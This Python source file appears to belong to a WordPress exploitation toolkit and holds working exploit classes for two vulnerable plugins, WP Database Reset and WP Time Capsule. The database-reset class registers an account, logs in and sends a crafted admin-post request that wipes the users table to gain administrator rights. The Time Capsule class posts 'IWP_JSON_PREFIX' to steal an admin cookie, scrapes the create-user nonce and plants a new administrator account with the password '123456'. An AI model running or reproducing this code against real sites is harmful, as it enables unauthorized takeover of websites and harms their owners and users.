"""
This Package is responsible to exploit vulnerability at WordPress (system, plugins, theme, e.t.c)
The global parameters are available to modify at config.py - under the "exploiter_data".
:requirements: python3.X, asyncio, datetime, requests, urllib3, imaplib, time
"""
import enum
import time
import random

try:
    from config import exploiter_data, logs
    from wordpress import WPRegisterUser
    from http_handler import HTTPWithSession
except Exception as e:
    if 'logs' in dir():
        logs.save_log("Import Error: {}".format(e))
    print("Import Error: {}".format(e))


class WPExploit(object):
    """
    This is the most abstract class at the family of the WordPress Exploiter - use for inhere uses only.
    Contain the most abstract method:
    :method plugin_name: don't have implementation and raise NotImplementError
    :method vulnerable_versions: don't have implementation and raise NotImplementError
    :method is_vulnerable_version: don't have implementation and raise NotImplementError
    :method get_references: have default implementation.
    :method is_vulnerable: don't have implementation and raise NotImplementError
    :method exploit: don't have implementation and raise NotImplementError
    """

    def __init__(self, domain, additional_data=None, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficiency
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        """
        self._url = "{}".format(domain).strip('/')
        self._additional_data = additional_data
        self._proxies = proxies
        self._logs = logs
        self._references = list()

    def plugin_name(self):
        """
        This method will return the plugin, theme, module name that is vulnerable.
        :return: str
        """

    def vulnerable_versions(self):
        """
        This method will return the plugin, theme, module version that is vulnerable.
        :return: str
        """
        raise NotImplementedError()

    def is_vulnerable_version(self, version_str):
        """
        This method will check if the given version is vulnerable version or not (if possible)
        :param version_str: str with the version
        :return: boolean
        """
        raise NotImplementedError()

    def get_references(self):
        """
        This method will return the list of URLs references to more information about the vulnerability.
        :return: list
        """
        return self._references

    def is_vulnerable(self, data=None, proxies=None):
        """
        Test whether vulnerable or not. If many requests or suspicious requests might be sent, consider adding
        aggresive parameter
        :param data: dictionary with data that can be used for the method
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: Boolean - whether domain is vulnerable or not
        """
        raise NotImplementedError()

    def exploit(self, data=None, proxies=None):
        """
        If possible to exploit (E.g., in server-side vulns) - exploit
        In client-side, return the exploit code to use
        :param data: dictionary with data that can be used for the method
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: Boolean - success or not
        """
        raise NotImplementedError()


class WPPluginExploiter(WPExploit):
    """
    This is an abstract class at the family of the WordPress Exploiter - using for Plugins exploiting.
    Contain the most abstract method:
    :method plugin_name: don't have implementation and raise NotImplementError
    :method vulnerable_versions: have an default implementation.
    :method is_vulnerable_version: have an default implementation.
    :method is_vulnerable: have an default implementation.
    :method exploit: don't have implementation and raise NotImplementError
    """
    _README_PATH = exploiter_data['WPPluginExploiter'].get('readme_path', "")

    def __init__(self, domain, additional_data=None, proxies=None):
        super().__init__(domain, additional_data, proxies)
        self._plugin_name = None
        self._plugin_version_start = "Unknown"  # override with the start vulnerable versions
        self._plugin_version_end = "Unknown"  # override with the end vulnerable versions
        self._plugin_version_start_op = "<="
        self._plugin_version_end_op = "<="
        self._http = HTTPWithSession()

    def plugin_name(self):
        return self._plugin_name

    def vulnerable_versions(self):
        try:
            if self._plugin_version_start is "Unknown":
                return "Unknown"
            elif self._plugin_version_end is "Unknown":
                return "Unknown"
            version = "{} {}".format(self._plugin_version_start, self._plugin_version_start_op)
            version += " V "
            version += "{} {}".format(self._plugin_version_end_op, self._plugin_version_end)
            return version
        except Exception as e:
            print("Something went wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: vulnerable_versions function has crashed, please try again later.")
            return "Unknown"

    def is_vulnerable_version(self, version_str):
        try:
            start_version = "{}".format(self._plugin_version_start).replace(".", "").replace(" ", "").strip()
            end_version = "{}".format(self._plugin_version_end).replace(".", "").replace(" ", "").strip()
            test_version = "{}".format(version_str).replace(".", "").replace(" ", "").strip()
            max_digits = len(start_version)
            if len(end_version) > max_digits:
                max_digits = len(end_version)
            if len(test_version) > max_digits:
                max_digits = len(test_version)
            start_version = self._build_version(start_version, max_digits)
            end_version = self._build_version(end_version, max_digits)
            test_version = self._build_version(test_version, max_digits)
            if self._plugin_version_start_op == "<" and self._plugin_version_end_op == "<":
                return start_version < test_version < end_version
            elif self._plugin_version_start_op == "<=" and self._plugin_version_end_op == "<":
                return start_version <= test_version < end_version
            elif self._plugin_version_start_op == "<" and self._plugin_version_end_op == "<=":
                return start_version < test_version <= end_version
            return start_version <= test_version <= end_version
        except Exception as e:
            print("Error: could not parse version.")
            print(e)
            return None

    def is_vulnerable(self, data=None, proxies=None):
        is_vulnerable = False
        try:
            is_vulnerable = self._readme_file(proxies)
        except Exception as e:
            print("Something went wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: find version of plugin with readme file failed.")
        finally:
            return is_vulnerable

    def _readme_file(self, readme_path=None, proxies=None):
        """
        All the plugins has in their readme file their version, this method will check in the readme file
        the plugin version (if possible).
        :param readme_path: the path to the readme file of the plugin.
        :param proxies: proxies to use (recommended)
        :return: boolean
        """
        if proxies is None:
            proxies = self._proxies
        if readme_path is None:
            readme_path = self._README_PATH
        url = "{}{}".format(self._url, readme_path)
        response = self._http.request(url=url, method="GET", proxies=proxies)
        if response is None:
            return False
        if "Stable tag:" not in response.text:
            return False
        version = response.text.split("Stable tag:")[1].split("\n")[0]  # get the version of the plugin
        print(version)
        return self.is_vulnerable_version(version)

    def exploit(self, data=None, proxies=None):
        raise NotImplementedError()

    def _build_version(self, version, num_of_digits):
        """
        This protected method is designed to build the version from WordPress version string to a unified comparable format.
        :param version: the version str
        :param num_of_digits: num of the required digits.
        :return: str
        """
        version = "{}".format(version).replace(".", "").replace(" ", "").strip()
        num_of_digits_to_add = (num_of_digits - len(version))
        version += ("0" * num_of_digits_to_add)
        version = int(version)
        return version


class WPDatabaseResetExploiter(WPPluginExploiter):
    """
    This class is one of the WordPress Exploiter family - designed to exploit specific plugin vulnerability.
    """
    _README_PATH = exploiter_data['WPDatabaseResetExploiter']. \
        get('readme_path', '/wp-content/plugins/wordpress-database-reset/readme.txt')

    def __init__(self, domain, proxies=None):
        super().__init__(domain=domain, proxies=proxies)
        self._plugin_name = "WP Database Reset"
        self._plugin_version_start = 0
        self._plugin_version_end = "3.15"
        self._plugin_version_start_op = "<="
        self._plugin_version_end_op = "<"
        self._references = [
            'https://www.wordfence.com/blog/2020/01/easily-exploitable-vulnerabilities-patched-in-wp-database-reset-plugin',
            'https://blog.qualys.com/webappsec/2020/01/24/wordpress-database-reset-plugin-vulnerability-cve-2020-7047-cve-2020-7048',
            'https://wpvulndb.com/vulnerabilities/10027']

    def _generate_random_user_data(self):
        random.seed(time.time())
        user_rand = random.randrange(1, 10000)
        user_data = {
            "username": "Elro_Attck_{}".format(user_rand),
            "password": "123456",
            "email": "elro{}@elro-sec.com".format(user_rand),
            "email_server": "mail.elro-sec.com",
            "email_pass": "elroWordpress",
            "login_page": "{}/wp-login.php".format(self._url),
            "register_page": "{}/wp-login.php?action=register".format(self._url),
            "action": "register",
            "email_user": "elro@elro-sec.com"
        }
        return user_data

    def __update_default_data(self, user_data):
        if user_data is None or type(user_data) != dict:
            user_data = dict()
        random_user_data = self._generate_random_user_data()
        for key, value in random_user_data.items():
            if key not in user_data:
                user_data[key] = value
        return user_data

    def exploit(self, data=None, proxies=None):
        """
        :param data: dictionary with data username & password for login, if dictionary is None,
                     the exploit will try to register, with default data.
                     username: will hold the username (for login or register new user)
                     password: will hole the password of the username (for login or register new user)
                     register_page: will hold the url for the register page (for register only)
                     login_page: will hold the url for the login page (for login or register new user)
                     action: "register" for register new user or "login" for login with existing one.
                     cannot send only the username & password => must send all the parameters or None!
        :param proxies: proxies
        :return: boolean
        """
        try:
            if proxies is None:
                proxies = self._proxies
            print("Start exploit .... check if possible.")
            self._http.clean_session()
            if not self.is_vulnerable(proxies=proxies):
                print("\tAttack are not possible on this web-site.")
                return False
            data = self.__update_default_data(data)
            print("\tThe attack seems possible")
            if data['action'] == "register":
                print("Register new user ...")
                is_registered = WPRegisterUser().register(data, proxies)
                if not is_registered:
                    print("\tRegistration Failed, please check the log file.")
                    return False
                print("\tRegistration success...")
            else:
                print("Registration is not necessary => skip")
            print("4) Try to log-in")
            is_logged_in = self._login(data=data, proxies=proxies)
            if not is_logged_in:
                print("\tLog-in failed please check the log file.")
                return False
            target = "{}/wp-admin/admin-post.php?" \
                     "db-reset-tables%5B%5D=users&db-reset-code=11111&db-reset-code-confirm=11111".format(self._url)
            print("\tLogin success")
            print("Execute the attack ..")
            payload_response = self._http.request(url=target, method="GET", proxies=proxies)
            if payload_response is None:
                print("\nthe attack is not possible on this web-site")
                return False
            print("\tThe site was hacked, you can login now at: {}".format(data['login_page']))
            print("\tUsername: {}".format(data['username']))
            print("\tPassword: {}".format(data['password']))
            print("\tRole: You have full permissions, you are an administrator")
            return True
        except Exception as e:
            print("Something went wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: failed to attack the web-site.")

    def _login(self, data, proxies=None):
        """
        This private method is designed to login into user account at the target WordPress system.
        :param data: the user data (dict)
        :param proxies: proxies to use
        :return: boolean indicate on success.
        """
        try:
            data = self.__update_default_data(data)
            username = data['username']
            password = data['password']
            login_page = data['login_page']
            self._http.clean_session()
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1'}
            response = self._http.request(url=login_page, method="POST", data=parameters, proxies=proxies)
            if response is None or "wordpress_logged_in" not in str(response.cookies):
                return False
            return True
        except Exception as e:
            self._logs.save_log(e, "Error: could not login to the web-site.")
            return False


class WPTimeCapsuleExploiter(WPPluginExploiter):
    """
    This class is one of the WordPress Exploiter family - designed to exploit specific plugin vulnerability.
    """
    _ADMIN_NEW_USER_PATH = "wp-admin/user-new.php"
    _README_PATH = "/wp-content/plugins/wp-time-capsule/readme.txt"

    def __init__(self, domain, proxies=None):
        super().__init__(domain=domain, proxies=proxies)
        self._plugin_name = "Backup and Staging by WP Time Capsule"
        self._plugin_version_start = 0
        self._plugin_version_end = "1.21.16"
        self._plugin_version_start_op = " <= "
        self._plugin_version_end_op = " < "
        self._references = ['https://wpvulndb.com/vulnerabilities/10010']
        self._user_data = self._generate_random_user_data()

    def _generate_random_user_data(self):
        random.seed(time.time())
        user_rand = random.randrange(1, 10000)
        user_data = {
            "email": "elro{}@elro-sec.com".format(user_rand),
            "user_login": "elro_{}".format(user_rand),
            "first_name": "WP-exploiter",
            "last_name": "{}".format(user_rand),
            "role": "administrator",
            "pass1": "123456",
            "pass2": "123456",
        }
        return user_data

    def exploit(self, user_data=None, proxies=None):
        """
        :param action: Enum - indicate on using in existing user OR register new one.
        :param user_data: dictionary with data username & password for login, if dictionary is None,
        :param proxies: proxies
        :return: boolean
        """
        try:
            if proxies is None:
                proxies = self._proxies
            print("Getting the admin Cookie from {} ...".format(self._url))
            print("Check if possible ... ")
            if not self.is_vulnerable(proxies=proxies):
                print("\tUnfortunately we were unable to detect a weakness on the above site.")
                return False
            self._http.clean_session()
            try:
                admin_cookie = self.__get_admin_cookie(proxies=proxies)
            except Exception as e:
                print("\tWe had some issues when trying to get the admin Cookie.\n\t", e)
                self._logs.save_log("We had some issues when trying to get the admin Cookie.", e)
                return False
            print("\tAdmin cookies achieved successfully:\n\t\tKey: {}\n\t\tValue: {}"
                  .format(admin_cookie.name, admin_cookie.value))
            print("Creating new administrator user ...")
            try:
                user_data = self.__update_default_data(user_data)
                is_registered = self.__register_new_admin(user_data)
                if not is_registered:
                    print("\tWe had some issues when trying to register the new user.")
                    return False
                print("\tRegistered new administrator successfully:\n"
                      "\tUser: {}"
                      "\n\tPassword: {}"
                      "\n\tLogin page: {}"
                      .format(user_data['user_login'], user_data['pass1'], self._url))
                return True
            except Exception as e:
                print("\tWe had some issues when trying to register the new user.")
                self._logs.save_log("We had some issues when trying to register the new user.", e)
                return False
        except Exception as e:
            print("Something went wrong, please check the logs file.", e)
            self._logs.save_log(e, "Error: failed to attack the web-site.")
            return False

    def __get_admin_cookie(self, proxies=None):
        """
        This function will find the admin cookie if exist in the exploit payload, and return here.
        :return: class http.cookiejar.Cookie
        :raises Exception: in case of not found this cookie.
        """
        if proxies is None:
            proxies = self._proxies
        self._http.clean_session()
        post_data = "IWP_JSON_PREFIX"
        headers = {"Referer": self._url}
        response = self._http.request(url=self._url, method="POST", data=post_data, headers=headers, proxies=proxies)
        if response is None:
            raise Exception("We could not get response from {}".format(self._url))
        # Looking for the exploit admin cookie
        for cookie in response.cookies:
            if "logged_in" in cookie.name:
                return cookie
        # Cookie not found => Guessing that the exploit dont work.
        raise Exception("Admin Cookie could not be found in the response from {}\nWe found only these Cookies:\n{}"
                        .format(self._url, response.cookies))

    def __register_new_admin(self, user_data, proxies=None):
        """
        This method will create new user with the role Administrator.
        :param admin_cookie: the admin cookie
        :param user_data: dict with the following data -
                          :email: optional - the new user email
                          :user_login: optional - the new username
                          :pass1: optional - default is 123456 (password)
                          :first_name: optional - the new first name
                          :last_name: optional - the new last name
                          :role: optional - the administrator role (default is administrator)
        :return: boolean
        """
        if proxies is None:
            proxies = self._proxies
        try:
            create_session = self.__get_admin_cookie(proxies=proxies)  # This for create a session with the web
        except Exception as e:
            self._logs.save_log(e)
            return False
        headers = {"Refferer": self._url}
        response = self._http.request(
            url="{}/wp-admin/user-new.php".format(self._url), method="GET", headers=headers, proxies=proxies
        )
        if response is None:
            return False
        response_text = "{}".format(response.content)
        if len(response_text) < 100:
            return False
        secret_key = response_text.split("_wpnonce_create-user\" value=\"")
        if len(secret_key) < 2:
            return False
        secret_key = secret_key[1].split("\"")[0]
        admin_new_user_path = "{}/{}".format(self._url, self._ADMIN_NEW_USER_PATH)
        if type(user_data) != dict:
            user_data = dict()
        user_data = self.__update_default_data(user_data)
        user_data['action'] = "createuser"
        user_data['_wp_http_referer'] = admin_new_user_path
        user_data['pw_weak'] = "on"
        user_data['createuser'] = "Add New User"
        user_data['_wpnonce_create-user'] = secret_key
        try:
            response = self._http.request(url=admin_new_user_path, method="POST", data=user_data,
                                          headers=headers, redirect=False, proxies=proxies)
            if response is None:
                return False
            return True
        except Exception as e:
            exception = "{}".format(e)
            if "?update=add&id=" in exception:
                return True
            return False

    def __update_default_data(self, user_data):
        if type(user_data) != dict:
            user_data = dict()
        random_user_data = self._generate_random_user_data()
        for key, value in random_user_data.items():
            if key not in user_data:
                user_data[key] = value
        return user_data
